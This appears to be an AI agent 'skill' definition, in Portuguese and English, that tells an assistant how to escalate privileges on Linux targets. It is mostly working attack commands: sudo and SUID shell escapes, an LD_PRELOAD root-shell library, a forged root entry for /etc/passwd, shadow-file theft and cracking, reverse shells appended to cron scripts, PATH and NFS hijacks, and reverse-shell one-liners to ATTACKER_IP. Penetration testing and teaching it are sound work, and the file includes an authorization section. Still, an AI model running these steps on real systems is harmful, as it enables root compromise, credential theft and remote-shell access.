---
name: Linux Privilege Escalation
description: Esta habilidade deve ser usada quando o usuário pedir para "escalar privilégios no Linux", "encontrar vetores de privesc em sistemas Linux", "explorar configurações incorretas de sudo", "abusar de binários SUID", "explorar cron jobs para acesso root", "enumerar sistemas Linux para escalação de privilégios", ou "obter acesso root a partir de shell com baixo privilégio". Fornece técnicas abrangentes para identificar e explorar caminhos de escalação de privilégios em sistemas Linux.
metadata:
  author: zebbern
  version: "1.1"
---

# Linux Privilege Escalation

## Purpose

Executar avaliações sistemáticas de escalação de privilégios em sistemas Linux para identificar e explorar configurações incorretas, serviços vulneráveis e fraquezas de segurança que permitem elevação de acesso de usuário com baixo privilégio para controle em nível root. Esta habilidade permite enumeração abrangente e exploração de vulnerabilidades de kernel, configurações incorretas de sudo, binários SUID, cron jobs, capacidades, PATH hijacking e fraquezas de NFS.

## Inputs / Prerequisites

### Acesso Necessário
- Acesso a shell com baixo privilégio no sistema Linux alvo
- Capacidade de executar comandos (shell interativo ou semi-interativo)
- Acesso de rede para conexões de reverse shell (se necessário)
- Máquina do atacante para hospedagem de payload e recebimento de shells

### Requisitos Técnicos
- Compreensão de permissões e proprietário do sistema de arquivos Linux
- Familiaridade com utilitários Linux comuns e scripting
- Conhecimento de versões de kernel e vulnerabilidades associadas
- Compreensão básica de compilação (gcc) para exploits personalizados

### Ferramentas Recomendadas
- Scripts LinPEAS, LinEnum ou Linux Smart Enumeration
- Linux Exploit Suggester (LES)
- Referência GTFOBins para exploração de binários
- John the Ripper ou Hashcat para cracking de senhas
- Netcat ou similar para reverse shells

## Outputs / Deliverables

### Outputs Primários
- Acesso a shell root no sistema alvo
- Documentação do caminho de escalação de privilégios
- Relatório de descobertas de enumeração do sistema
- Recomendações para remediação

### Artefatos de Evidência
- Screenshots de escalação de privilégios bem-sucedida
- Logs de output de comando demonstrando acesso root
- Detalhes de vulnerabilidade identificada
- Arquivos de configuração explorados

## Core Workflow

### Phase 1: System Enumeration

#### Basic System Information
Colete informações fundamentais do sistema para pesquisa de vulnerabilidade:

```bash
# Hostname and system role
hostname

# Kernel version and architecture
uname -a

# Detailed kernel information
cat /proc/version

# Operating system details
cat /etc/issue
cat /etc/*-release

# Architecture
arch
```

#### User and Permission Enumeration

```bash
# Current user context
whoami
id

# Users with login shells
cat /etc/passwd | grep -v nologin | grep -v false

# Users with home directories
cat /etc/passwd | grep home

# Group memberships
groups

# Other logged-in users
w
who
```

#### Network Information

```bash
# Network interfaces
ifconfig
ip addr

# Routing table
ip route

# Active connections
netstat -antup
ss -tulpn

# Listening services
netstat -l
```

#### Process and Service Enumeration

```bash
# All running processes
ps aux
ps -ef

# Process tree view
ps axjf

# Services running as root
ps aux | grep root
```

#### Environment Variables

```bash
# Full environment
env

# PATH variable (for hijacking)
echo $PATH
```

### Phase 2: Automated Enumeration

Implante scripts automatizados para enumeração abrangente:

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# Linux Smart Enumeration
./lse.sh -l 1

# Linux Exploit Suggester
./les.sh
```

Transfira scripts para o sistema alvo:

```bash
# On attacker machine
python3 -m http.server 8000

# On target machine
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Phase 3: Kernel Exploits

#### Identify Kernel Version

```bash
uname -r
cat /proc/version
```

#### Search for Exploits

```bash
# Use Linux Exploit Suggester
./linux-exploit-suggester.sh

# Manual search on exploit-db
searchsploit linux kernel [version]
```

#### Common Kernel Exploits

| Versão de Kernel | Exploit | CVE |
|------------------|---------|-----|
| 2.6.x - 3.x | Dirty COW | CVE-2016-5195 |
| 4.4.x - 4.13.x | Double Fetch | CVE-2017-16995 |
| 5.8+ | Dirty Pipe | CVE-2022-0847 |

#### Compile and Execute

```bash
# Transfer exploit source
wget http://ATTACKER_IP/exploit.c

# Compile on target
gcc exploit.c -o exploit

# Execute
./exploit
```

### Phase 4: Sudo Exploitation

#### Enumerate Sudo Privileges

```bash
sudo -l
```

#### GTFOBins Sudo Exploitation
Consulte https://gtfobins.github.io para comandos de exploração:

```bash
# Example: vim with sudo
sudo vim -c ':!/bin/bash'

# Example: find with sudo
sudo find . -exec /bin/sh \; -quit

# Example: awk with sudo
sudo awk 'BEGIN {system("/bin/bash")}'

# Example: python with sudo
sudo python -c 'import os; os.system("/bin/bash")'

# Example: less with sudo
sudo less /etc/passwd
!/bin/bash
```

#### LD_PRELOAD Exploitation
Quando env_keep inclui LD_PRELOAD:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# Compile shared library
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Execute with sudo
sudo LD_PRELOAD=/tmp/shell.so find
```

### Phase 5: SUID Binary Exploitation

#### Find SUID Binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

#### Exploit SUID Binaries
Consulte GTFOBins para exploração de SUID:

```bash
# Example: base64 for file reading
LFILE=/etc/shadow
base64 "$LFILE" | base64 -d

# Example: cp for file writing
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p

# Example: find with SUID
find . -exec /bin/sh -p \; -quit
```

#### Password Cracking via SUID

```bash
# Read shadow file (if base64 has SUID)
base64 /etc/shadow | base64 -d > shadow.txt
base64 /etc/passwd | base64 -d > passwd.txt

# On attacker machine
unshadow passwd.txt shadow.txt > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

#### Add User to passwd (if nano/vim has SUID)

```bash
# Generate password hash
openssl passwd -1 -salt new newpassword

# Add to /etc/passwd (using SUID editor)
newuser:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

### Phase 6: Capabilities Exploitation

#### Enumerate Capabilities

```bash
getcap -r / 2>/dev/null
```

#### Exploit Capabilities

```bash
# Example: python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Example: vim with cap_setuid
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'

# Example: perl with cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### Phase 7: Cron Job Exploitation

#### Enumerate Cron Jobs

```bash
# System crontab
cat /etc/crontab

# User crontabs
ls -la /var/spool/cron/crontabs/

# Cron directories
ls -la /etc/cron.*

# Systemd timers
systemctl list-timers
```

#### Exploit Writable Cron Scripts

```bash
# Identify writable cron script from /etc/crontab
ls -la /opt/backup.sh        # Check permissions
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh

# If cron references non-existent script in writable PATH
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home/user/antivirus.sh
chmod +x /home/user/antivirus.sh
```

### Phase 8: PATH Hijacking

```bash
# Find SUID binary calling external command
strings /usr/local/bin/suid-binary
# Shows: system("service apache2 start")

# Hijack by creating malicious binary in writable PATH
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
chmod +x /tmp/service
/usr/local/bin/suid-binary      # Execute SUID binary
```

### Phase 9: NFS Exploitation

```bash
# On target - look for no_root_squash option
cat /etc/exports

# On attacker - mount share and create SUID binary
showmount -e TARGET_IP
mount -o rw TARGET_IP:/share /tmp/nfs

# Create and compile SUID shell
echo 'int main(){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell

# On target - execute
/share/shell
```

## Quick Reference

### Enumeration Commands Summary
| Propósito | Comando |
|-----------|---------|
| Versão de kernel | `uname -a` |
| Usuário atual | `id` |
| Direitos sudo | `sudo -l` |
| Arquivos SUID | `find / -perm -u=s -type f 2>/dev/null` |
| Capacidades | `getcap -r / 2>/dev/null` |
| Cron jobs | `cat /etc/crontab` |
| Diretórios graváveis | `find / -writable -type d 2>/dev/null` |
| Exportações NFS | `cat /etc/exports` |

### Reverse Shell One-Liners
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat
nc -e /bin/bash ATTACKER_IP 4444

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

### Recursos-Chave
- GTFOBins: https://gtfobins.github.io
- LinPEAS: https://github.com/carlospolop/PEASS-ng
- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester

## Constraints and Guardrails

### Operational Boundaries
- Verifique exploits de kernel em ambiente de teste antes do uso em produção
- Exploits de kernel com falha podem causar travamento do sistema
- Documente todas as alterações feitas durante escalação de privilégios
- Mantenha persistência de acesso apenas conforme autorizado

### Technical Limitations
- Kernels modernos podem ter mitigações de exploit (ASLR, SMEP, SMAP)
- AppArmor/SELinux pode restringir técnicas de exploração
- Ambientes de container limitam exploits em nível de kernel
- Sistemas endurecidos podem ter configurações sudo restritas

### Legal and Ethical Requirements
- Autorização escrita necessária antes de testar
- Mantenha-se dentro dos limites de escopo definidos
- Reporte descobertas críticas imediatamente
- Não acesse dados além dos requisitos de escopo

## Examples

### Example 1: Sudo to Root via find

**Cenário**: Usuário tem direitos sudo para comando find

```bash
$ sudo -l
User user may run the following commands:
    (root) NOPASSWD: /usr/bin/find

$ sudo find . -exec /bin/bash \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Example 2: SUID base64 for Shadow Access

**Cenário**: Binário base64 tem bit SUID definido

```bash
$ find / -perm -u=s -type f 2>/dev/null | grep base64
/usr/bin/base64

$ base64 /etc/shadow | base64 -d
root:$6$xyz...:18000:0:99999:7:::

# Crack offline with john
$ john --wordlist=rockyou.txt shadow.txt
```

### Example 3: Cron Job Script Hijacking

**Cenário**: Cron job do root executa script gravável

```bash
$ cat /etc/crontab
* * * * * root /opt/scripts/backup.sh

$ ls -la /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 50 /opt/scripts/backup.sh

$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/backup.sh

# Wait 1 minute
$ /tmp/bash -p
# id
uid=1000(user) gid=1000(user) euid=0(root)
```

## Troubleshooting

| Problema | Soluções |
|----------|----------|
| Compilação de exploit falha | Verifique gcc: `which gcc`; compile no atacante para mesma arquitetura; use `gcc -static` |
| Reverse shell não conecta | Verifique firewall; teste portas 443/80; use payloads staged; verifique filtragem de saída |
| Binário SUID não explorável | Verifique versão corresponde GTFOBins; verifique AppArmor/SELinux; alguns binários descartam privilégios |
| Cron job não executado | Verifique cron rodando: `service cron status`; verifique permissões +x; verifique PATH em crontab |